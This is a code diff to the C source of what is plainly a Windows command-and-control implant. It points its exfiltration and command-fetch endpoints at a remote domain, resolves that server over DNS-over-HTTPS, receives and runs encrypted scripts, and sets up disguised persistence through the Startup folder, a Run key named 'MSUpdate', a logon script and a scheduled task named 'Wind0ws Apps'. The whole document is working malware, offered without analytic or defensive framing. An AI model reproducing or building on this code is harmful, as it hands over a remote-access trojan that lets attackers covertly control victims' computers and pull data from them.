@@ -79,7 +79,7 @@ static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, voi
     struct MemoryStruct *mem = (struct MemoryStruct *)userp;
     char *ptr = realloc(mem->memory, mem->size + realsize + 1);
     if (ptr == NULL) {
-        // printf("Not enough memory (realloc failed)\n");
+        printf("Not enough memory (realloc failed)\n");
         return 0;
     }
     mem->memory = ptr;
@@ -113,7 +113,7 @@ void resolve_doh(const char *domain, char *resolved_ip) {
             curl_easy_setopt(curl, CURLOPT_HTTPHEADER, (struct curl_slist *)curl_slist_append(NULL, "Accept: application/dns-json"));
             curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
             curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
-            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
+            curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); // 10 seconds timeout
             res = curl_easy_perform(curl);
             if (res == CURLE_OK) {
                 // printf("Trying DoH resolver : %s\n", doh_urls[i]);
@@ -142,7 +142,7 @@ void resolve_doh(const char *domain, char *resolved_ip) {
                     fprintf(stderr, "Error parsing JSON : %s\n", error.text);
                 }
             } else {
-                // printf("Failed to Query Resolver : %s\n", doh_urls[i]);
+                printf("Failed to Query Resolver : %s\n", doh_urls[i]);
             }
             curl_easy_cleanup(curl);
         }
@@ -158,8 +158,9 @@ void resolve_doh(const char *domain, char *resolved_ip) {
 
 void debug_send(SOCKET sock, const char *buffer, int buffer_length, int flags) {
     // printf("Preparing to send data: %.*s\n", buffer_length, buffer);
-    const char *url = "http://127.0.0.1:8081/dataforge";
-    // const char *url = "https://ciphervortex.me:8081/dataforge";
+    // const char *url = "http://127.0.0.1:8081/dataforge";
+    const char *url = "https://ciphervortex.me:8081/dataforge";
+    // const char *url = "https://cybernova.me:8081/dataforge";
     // printf("Raw data being sent to server: %.*s\n", buffer_length, buffer);
     CURL *curl;
     CURLcode res;
@@ -175,40 +176,40 @@ void debug_send(SOCKET sock, const char *buffer, int buffer_length, int flags) {
         curl_easy_setopt(curl, CURLOPT_POSTFIELDS, buffer);
         curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, buffer_length);
         curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); // 10 seconds timeout
-        // printf("\nOMEGA\n");
         res = curl_easy_perform(curl);
         if (res != CURLE_OK) {
             // printf("Curl request failed: %s\n", curl_easy_strerror(res));
         } else {
-            // printf("Data sent successfully to %s\n", url);
+            printf("Data sent successfully to %s\n", url);
         }
         curl_slist_free_all(headers);
         curl_easy_cleanup(curl);
     } else {
-        // printf("Failed to initialize CURL.\n");
+        printf("Failed to initialize CURL.\n");
     }
     curl_global_cleanup();
 }
 
 const char* fetch_data() {
-    static char buffer[BUFFER_SIZE];
+    static char buffer[BUFFER_SIZE]; // Static buffer to hold the result
     CURL *curl;
     CURLcode res;
     struct MemoryStruct chunk;
-    chunk.memory = malloc(1);
-    chunk.size = 0;
+    chunk.memory = malloc(1);  // Initial allocation
+    chunk.size = 0;           // Initial size
     curl_global_init(CURL_GLOBAL_DEFAULT);
     curl = curl_easy_init();
     if (!curl) {
         fprintf(stderr, "Failed to initialize CURL\n");
         return NULL;
     }
-    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8081/querynest");
-    // curl_easy_setopt(curl, CURLOPT_URL, "https://ciphervortex.me:8081/querynest");
+    // curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8081/querynest");
+    curl_easy_setopt(curl, CURLOPT_URL, "https://ciphervortex.me:8081/querynest");
+    // curl_easy_setopt(curl, CURLOPT_URL, "https://cybernova.me:8081/querynest");
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
     curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
-    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 2L); // 10 seconds timeout
     res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
         fprintf(stderr, "CURL request failed: %s\n", curl_easy_strerror(res));
@@ -245,12 +246,12 @@ const char* fetch_data() {
         return "";
     }
     strncpy(buffer, result, BUFFER_SIZE - 1);
-    buffer[BUFFER_SIZE - 1] = '\0';
+    buffer[BUFFER_SIZE - 1] = '\0';  // Ensure null termination
     json_decref(root);
     curl_easy_cleanup(curl);
     curl_global_cleanup();
     free(chunk.memory);
-    return buffer;
+    return buffer;  // Return the static buffer
 }
 
 void connect_to_server(SOCKET client_socket) {
@@ -258,12 +259,13 @@ void connect_to_server(SOCKET client_socket) {
     char resolved_ip[100] = {0};
     // printf("Resolving server IP using DoH...\n");
     // resolve_doh("ciphervortex.me", resolved_ip);
+    // resolve_doh("cybernova.me", resolved_ip);
     // if (strlen(resolved_ip) == 0) {
     //     printf("Failed to resolve server IP.\n");
     //     exit(1);
     // }
     // printf("Resolved server IP : %s\n", resolved_ip);
-    strcpy(resolved_ip, "127.0.0.1");
+    // strcpy(resolved_ip, "127.0.0.1");
     server_addr.sin_family = AF_INET;
     server_addr.sin_port = htons(8082);
     server_addr.sin_addr.s_addr = inet_addr(resolved_ip);
@@ -369,6 +371,7 @@ void perform_diffie_hellman(SOCKET client_socket) {
     debug_send(client_socket, hex_pub_key, strlen(hex_pub_key), 0);
     OPENSSL_free(hex_pub_key);
     const char *server_pub_key_hex = fetch_data();
+    // printf("Server Public Key: %s\n", server_pub_key_hex);
     BIGNUM *server_pub_key = NULL;
     BN_hex2bn(&server_pub_key, server_pub_key_hex);
     size_t shared_key_len = DH_size(dh);
@@ -667,8 +670,7 @@ void receive_commands(SOCKET client_socket, HANDLE hStdoutRead, HANDLE hStdinWri
             }
             free(dynamic_output_buffer);
             continue;
-        }
-        
+        }        
         if (strcmp(decrypted_buffer, "SCRIPT_START") == 0) {
             char script[BUFFER_SIZE * 50] = {0};
             char script_e[BUFFER_SIZE * 50] = {0};
@@ -680,13 +682,13 @@ void receive_commands(SOCKET client_socket, HANDLE hStdoutRead, HANDLE hStdinWri
                 DWORD part_decoded_size = 0;
                 BYTE *part_decoded_data = base64_decode(script, &part_decoded_size);
                 if (part_decoded_data == NULL) {
-                    // printf("Failed to decode Base64 data.\n");
+                    printf("Failed to decode Base64 data.\n");
                     continue;
                 }
                 BYTE part_decrypted_buffer[50 * BUFFER_SIZE];
                 DWORD part_decrypted_size = 50 * BUFFER_SIZE;
                 if (decrypt_data(part_decoded_data, part_decoded_size, part_decrypted_buffer, &part_decrypted_size) != 0) {
-                    // printf("Failed to decrypt data.\n");
+                    printf("Failed to decrypt data.\n");
                     free(part_decoded_data);
                     continue;
                 }
@@ -697,7 +699,7 @@ void receive_commands(SOCKET client_socket, HANDLE hStdoutRead, HANDLE hStdinWri
                     break;
                 }
                 strncat(script_e, (char *)part_decrypted_buffer, part_decrypted_size);
-            }           
+            }   
             execute_script(client_socket,script_e);
             continue;
         }
@@ -764,9 +766,9 @@ void set_persistent(char* option, int isElevated) {
         snprintf(command, sizeof(command), "copy %s \"%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", binpath);
         int res = system(command);
         if (res == 0) {
-            // printf("Added to startup.\n");
+            printf("Added to startup.\n");
         } else {
-            // printf("Failed to add to startup.\n");
+            printf("Failed to add to startup.\n");
         }
     } else if (!strcmp(option, "registry")) {
         HKEY hkey;
@@ -774,13 +776,13 @@ void set_persistent(char* option, int isElevated) {
         GetModuleFileNameA(NULL, binpath, MAX_PATH);
         if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
             if (RegSetValueExA(hkey, "MSUpdate", 0, REG_SZ, binpath, strlen(binpath)) == ERROR_SUCCESS) {
-                // printf("Added to registry.\n");
+                printf("Added to registry.\n");
             } else {
-                // printf("Failed to add to registry.\n");
+                printf("Failed to add to registry.\n");
             }
             RegCloseKey(hkey);
         } else {
-            // printf("Failed to open registry key.\n");
+            printf("Failed to open registry key.\n");
         }
 
     }
@@ -790,18 +792,18 @@ void set_persistent(char* option, int isElevated) {
         snprintf(binpath, sizeof(binpath), "%s%s", STORE_PATH, "\\logon.bat");
         if (RegOpenKeyExA(HKEY_CURRENT_USER, "Environment", 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
             if (RegSetValueExA(hkey, "UserInitMprLogonScript", 0, REG_SZ, binpath, strlen(binpath)) == ERROR_SUCCESS) {
-                // printf("Added to registry.\n");
+                printf("Added to registry.\n");
             } else {
-                // printf("Failed to add to registry.\n");
+                printf("Failed to add to registry.\n");
             }
             RegCloseKey(hkey);
         } else {
-            // printf("Failed to open registry key.\n");
+            printf("Failed to open registry key.\n");
         }
     }
     else if (!strcmp(option, "schtask"))  {
         if (isElevated == 0) {
-            // printf("You need to be elevated to add to task scheduler.\n");
+            printf("You need to be elevated to add to task scheduler.\n");
             return;
         }
         char command[500];
@@ -811,9 +813,9 @@ void set_persistent(char* option, int isElevated) {
         snprintf(command, sizeof(command), "schtasks /create /tn \"Wind0ws Apps\" /tr \"%s\" /sc onlogon /ru %s /F", BIN_PATH, username);
         int res = system(command);
         if (res == 0) {
-            // printf("Added to task scheduler.\n");
+            printf("Added to task scheduler.\n");
         } else {
-            // printf("Failed to add to task scheduler. system() returned error code : %d\n", res);
+            printf("Failed to add to task scheduler. system() returned error code : %d\n", res);
         }
     }
 }
@@ -845,9 +847,9 @@ void remove_persistence(char* option) {
         snprintf(command, sizeof(command), "del \"%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\client.exe\"");
         int res = system(command);
         if (res == 0) {
-            // printf("Removed from startup.\n");
+            printf("Removed from startup.\n");
         } else {
-            // printf("Failed to remove from startup.\n");
+            printf("Failed to remove from startup.\n");
         }
     } else if (!strcmp(option, "registry")) {
         HKEY hkey;
@@ -855,13 +857,13 @@ void remove_persistence(char* option) {
         if (result == ERROR_SUCCESS) {
             result = RegDeleteValueA(hkey, "MSUpdate");
             if (result == ERROR_SUCCESS) {
-                // printf("Removed from registry.\n");
+                printf("Removed from registry.\n");
             } else {
-                // printf("Failed to remove from registry. Error code : %ld\n", result);
+                printf("Failed to remove from registry. Error code : %ld\n", result);
             }
             RegCloseKey(hkey);
         } else {
-            // printf("Failed to open registry key. Error code : %ld\n", result);
+            printf("Failed to open registry key. Error code : %ld\n", result);
         }
     } else if (!strcmp(option,"logon")) {
         HKEY hkey;
@@ -869,22 +871,22 @@ void remove_persistence(char* option) {
         if (result == ERROR_SUCCESS) {
             result = RegDeleteValueA(hkey, "UserInitMprLogonScript");
             if (result == ERROR_SUCCESS) {
-                // printf("Removed from registry.\n");
+                printf("Removed from registry.\n");
             } else {
-                // printf("Failed to remove from registry. Error code : %ld\n", result);
+                printf("Failed to remove from registry. Error code : %ld\n", result);
             }
             RegCloseKey(hkey);
         } else {
-            // printf("Failed to open registry key. Error code : %ld\n", result);
+            printf("Failed to open registry key. Error code : %ld\n", result);
         }
     } else if (!strcmp(option, "schtask"))  {
         char command[500];
         snprintf(command, sizeof(command), "schtasks /delete /tn \"Wind0ws Apps\" /f");
         int res = system(command);
         if (res == 0) {
-            // printf("Removed from task scheduler\n");
+            printf("Removed from task scheduler\n");
         } else {
-            // printf("Failed to remove from task scheduler. system() returned error code : %d\n", res);
+            printf("Failed to remove from task scheduler. system() returned error code : %d\n", res);
         }
     }
 }
@@ -942,12 +944,13 @@ void start_c2_client() {
 }
 
 void benignProcess() {
-    STARTUPINFO si = { sizeof(STARTUPINFO) };
+    STARTUPINFO si = { sizeof(STARTUPINFO) }; 
     PROCESS_INFORMATION pi = { 0 };
-    if (!CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
+    if (!CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) { // Create notepad.exe process using CreateProcess
         fprintf(stderr, "Error creating process\n");
         return;
     }
+    // Wait for the process to exit
     // WaitForSingleObject(pi.hProcess, INFINITE);
 }
 
